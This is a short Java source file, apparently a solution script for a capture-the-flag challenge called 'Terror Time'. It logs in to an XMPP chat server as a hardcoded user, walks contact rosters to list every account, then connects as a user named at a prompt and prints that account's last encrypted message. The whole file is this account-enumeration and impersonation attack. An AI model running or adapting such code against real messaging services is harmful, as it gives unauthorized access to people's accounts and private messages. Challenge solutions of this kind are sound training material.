package terrortimesol;

import java.util.Collection;
import java.util.LinkedList;
import java.util.Scanner;

import org.jivesoftware.smack.roster.Roster;
import org.jivesoftware.smack.roster.RosterEntry;

public class Main {

	public static LinkedList<String> getAllAccounts() throws InterruptedException {
		System.out.println("[*] Find all the accounts...");
		String username = "elias--vhost-1310";
		LinkedList<RosterEntry> allAccounts = new LinkedList<RosterEntry>();
		XmppClient xmppClient = null;
		Roster roster = null;

		int index = 0;
		LinkedList<String> usernameList = new LinkedList<String>();
		usernameList.add(username);

		do {
			username = usernameList.get(index);
			xmppClient = new XmppClient(username);
			roster = xmppClient.getRoster();

			Collection<RosterEntry> entries = null;
			int count = 0;
			int noEntries = 0;
			while (count < 3 || noEntries < 2) {
				if (roster != null) {
					entries = roster.getEntries();
					count++;
					noEntries = entries.size();
				}
				Thread.sleep(1000);
			}

			if (entries != null) {
				System.out.println("[+] Contact list of " + username);
				for (RosterEntry entry : entries) {
					String uname = entry.getJid().toString().split("@")[0];
					if (!usernameList.contains(uname)) {
						allAccounts.addLast(entry);
						usernameList.addLast(uname);
					}
					System.out.println("        " + entry);
				}
			}
			xmppClient.disconnect();
			index++;
			Thread.sleep(2000);
		} while (index < usernameList.size());

		return usernameList;
	}

	public static void printTheLastEncryptedMessage() {
		Scanner input = new Scanner(System.in);
		System.out.println("\n[*] Print the last encrypted message");
		System.out.print("[*] Please enter the username: ");
		String username = input.nextLine();
		input.close();
		XmppClient xmppClient = new XmppClient(username);
		xmppClient.printTheLastEncryptedMessage();
	}

	public static void main(String[] args) throws InterruptedException {
		Main.getAllAccounts();
		Main.printTheLastEncryptedMessage();
	}

}
